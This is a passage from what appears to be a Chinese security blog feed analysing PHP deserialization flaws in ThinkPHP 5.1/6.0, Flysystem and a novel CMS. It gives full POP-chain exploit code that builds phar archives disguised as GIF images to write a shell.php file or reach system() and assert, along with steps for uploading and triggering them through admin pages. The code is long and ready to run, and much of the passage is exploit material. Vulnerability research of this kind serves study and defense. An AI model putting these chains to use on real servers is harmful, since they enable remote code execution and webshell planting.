keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapter</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">"./public/shell.php"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">adapter</span> <span class="token operator">=</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Local</span>     <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$writeFlags</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//对应file_put_contents的第三个参数</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token variable">$local</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>Local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">(</span><span class="token variable">$local</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>将生成的phar文件修改成gif文件，找一处上传gif图片的点，上传这个pahr文件，在添加商品处：admin/store.StoreProduct/create.html</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/5.png" alt="" loading="lazy"></p><p>利用phar协议执行反序列化</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/6.png" alt="" loading="lazy"></p><h4 id="狂雨小说cms-phar反序列化"><a href="#狂雨小说cms-phar反序列化" class="headerlink" title="狂雨小说cms phar反序列化"></a><strong>狂雨小说cms phar反序列化</strong></h4><p>狂雨小说cms最新版是基于tp5.1.33开发的，此漏洞在后台触发。在控制器\application\admin\controller\Ranking.php中的delAllFiles方法，dir参数可控</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/7.png" alt="" loading="lazy"></p><p>利用tp的pop链生成phar文件，exp如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$append</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">"123456"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Request</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$param</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$hook</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"assert"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"var_ajax"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"visible"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"phpinfo()"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Windows</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>修改后缀为gif，找一处图片上传的点，将phar.gif上传</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/8.png" alt="" loading="lazy"></p><p>最后利用phar协议执行gif文件进行反序列攻击。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/9.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;phar的结构&quot;&gt;&lt;a href=&quot;#phar的结构&quot; class=&quot;headerlink&quot; title=&quot;phar的结构&quot;&gt;&lt;/a&gt;&lt;strong&gt;phar的结构&lt;/strong&gt;&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;a stub是一个文件标志，格式为 ：&lt;code&gt;xx
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP6.0反序列化漏洞分析</title>
    <link href="http://yoursite.com/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-05-13T09:07:31.000Z</published>
    <updated>2020-05-13T09:11:10.699Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h4><p>安装tp6.0</p><pre class=" language-shell"><code class="language-shell">composer create-project --prefer-dist topthink/think=6.0.x-dev tp6.0cd tp6.0php think run</code></pre><p>在index控制器中写入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>BaseController</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p>全局搜索__destruct魔术方法，在\vendor\topthink\think-orm\src\Model.php</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lazySave</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>$this-&gt;lazySave可控，为true的时候，执行save方法，跟进save方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/1.png" alt="" loading="lazy"></p><p>这里要满足两个if语句，$this-&gt;isEmpty()为false，$this-&gt;trigger要不为false，跟进isEmpty方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>$this-&gt;data可控，当存在的时候返回false，继续跟进trigger方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/2.png" alt="" loading="lazy"></p><p>$this-&gt;withEvent可控，当为false时，进入teturn语句，满足if语句，继续看下一行代码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">exists</span> <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">updateData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">insertData</span><span class="token punctuation">(</span><span class="token variable">$sequence</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>$this-&gt;exists可控，为true时，跟进updateData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/3.png" alt="" loading="lazy"></p><p>这里要执行到checkAllowFields方法，需要经过2个if语句，第一个if要满足$this-&gt;trigger不为false</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'BeforeUpdate'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>第二个if要满足$data存在，跟进下getChangedData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/4.png" alt="" loading="lazy"></p><p>这里满足$this-&gt;force存在，$this-&gt;data也可控，即2个if语句也绕过了，就可以继续跟进checkAllowFields方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/5.png" alt="" loading="lazy"></p><p>这里发现$this-&gt;table和$this-&gt;suffix进行连接操作，即为字符串，可以触发__toString方法，这里就可以利用ThinkPHP5.2.x那条pop链来构造rce，全局进行搜索__toString方法，跟到\vendor\topthink\think-orm\src\model\concern\Conversion.php文件</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进toJson-&gt;toArray方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/6.png" alt="" loading="lazy"></p><p>这里需要执行到getAttr方法，需要满足其中一个$data的key和$this-&gt;visible的key相同，既可以触发getAttr方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getAttr</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// key = name</span><span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$value</span>    <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// whoami</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvalidArgumentException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isRelationAttr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$value</span>    <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// fanxing  whoami</span><span class="token punctuation">}</span></code></pre><p>跟进getData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/7.png" alt="" loading="lazy"></p><p>这里$fieldName的键要存在于$this-&gt;data数组中，而$fieldName时通过getRealFieldName获取的</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getRealFieldName</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">strict</span> <span class="token operator">?</span> <span class="token variable">$name</span> <span class="token punctuation">:</span> Str<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">snake</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>满足$this-&gt;strict为true就返回传递进来的值。最后又回到getAttr方法中</p><pre class=" language-php"><code class="language-php"><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>经过上面的分析，这里满足$name和$value可控，跟进getValue方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/8.png" alt="" loading="lazy"></p><p>漏洞触发点在圈起的地方，这里value可控，只需要满足$closure可控就可以rce，看上行代码，$this-&gt;withAttr是可控的，$fieldName是经过getRealFieldName方法获得的，也是可控的，最后，整个pop链就分析完了。</p><h4 id="pop链流程"><a href="#pop链流程" class="headerlink" title="pop链流程"></a><strong>pop链流程</strong></h4><p>这里利用下<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md" target="_blank" rel="noopener">Mochazz</a>的pop链分析图片</p><p><img src="https://raw.githubusercontent.com/Mochazz/ThinkPHP-Vuln/master/ThinkPHP6/ThinkPHP6.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/4.png" alt="" loading="lazy"></p><h4 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a><strong>EXP编写</strong></h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span><span class="token keyword">trait</span> <span class="token class-name">Conversion</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">trait</span> <span class="token class-name">Attribute</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Attribute</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Conversion</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$lazySave</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$exists</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$field</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$schema</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$visible</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">visible</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'111'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/9.png" alt="" loading="lazy"></p><p>tp6.0反序列还有其他链，复制下<a href="http://hed9eh0g.top/?p=217" target="_blank" rel="noopener">Hed9eh0g</a>这条链写入文件的poc</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$autosave</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>AbstractCache</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Adapter</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token 